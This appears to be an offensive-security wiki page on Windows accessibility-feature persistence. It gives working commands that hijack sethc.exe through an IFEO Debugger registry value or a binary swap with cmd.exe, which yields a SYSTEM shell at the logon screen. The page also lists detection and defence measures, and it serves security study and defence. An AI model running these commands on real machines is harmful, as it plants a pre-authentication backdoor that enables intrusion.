---
title: Accessibility (Sticky Keys) Persistence
slug: accessibility-stickykeys-persistence
---

> **TL;DR:** Replace `sethc.exe`/`utilman.exe` with `cmd.exe` — or set an IFEO debugger — so pressing Shift five times (or clicking Ease of Access) at the logon screen spawns a SYSTEM shell.

## What it is
Windows ships accessibility helpers (`sethc.exe` for Sticky Keys, `utilman.exe` for Ease of Access, `osk.exe`, `narrator.exe`, `magnify.exe`, `displayswitch.exe`) that the Winlogon process launches as `NT AUTHORITY\SYSTEM` *before* a user logs in. Hijacking the binary or its Image File Execution Options (IFEO) `Debugger` value turns the logon screen into a pre-auth SYSTEM shell — usable over RDP or at the console.

## Preconditions / where it applies
- Administrator (to write `C:\Windows\System32` or `HKLM\...\Image File Execution Options`)
- Physical, RDP, or RDP NLA-disabled access to the lock/login screen
- Works on Windows 10/11 and Server 2016+; UAC and TrustedInstaller ACLs on `System32` require ownership change for the binary-swap variant

## Technique
Two flavours: (1) replace the accessibility binary outright, or (2) cleaner — point IFEO at `cmd.exe` so Winlogon launches the debugger instead of the real `sethc.exe`. The IFEO method needs only a single registry write and survives WFP file repair.

```cmd
:: --- IFEO debugger persistence (preferred) ---
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

:: --- Binary replacement variant ---
takeown /f C:\Windows\System32\sethc.exe
icacls  C:\Windows\System32\sethc.exe /grant administrators:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

:: trigger: press Shift x5 at logon, or click Ease of Access (utilman) icon
```

The same trick works on `utilman.exe`, `osk.exe`, `magnify.exe`, `narrator.exe`, `displayswitch.exe`, and `atbroker.exe`. Cross-reference [[persistence-techniques-windows]] and [[user-account-control]] — the spawned shell inherits Winlogon's SYSTEM token without prompting.

## Detection and defence
- Sysmon Event ID 13 (`RegistryEvent SetValue`) on the IFEO `Debugger` value for any accessibility binary
- File-integrity monitoring on `System32\sethc.exe`, `utilman.exe`, `osk.exe`, etc. — hash mismatch with Microsoft catalog
- 4688 process-create with `cmd.exe`/`powershell.exe` whose parent is `winlogon.exe` is a strong signal
- Defence: enforce Network Level Authentication on RDP (prevents reaching the logon screen unauthenticated) and audit `HKLM\...\Image File Execution Options` writes

## References
- [ired.team — Sticky Keys](https://www.ired.team/offensive-security/persistence/t1015-sethc) — original walkthrough
- [MITRE ATT&CK T1546.008](https://attack.mitre.org/techniques/T1546/008/) — Accessibility Features sub-technique
- [HackTricks — Accessibility persistence](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/accessibility-features) — variants and triggers
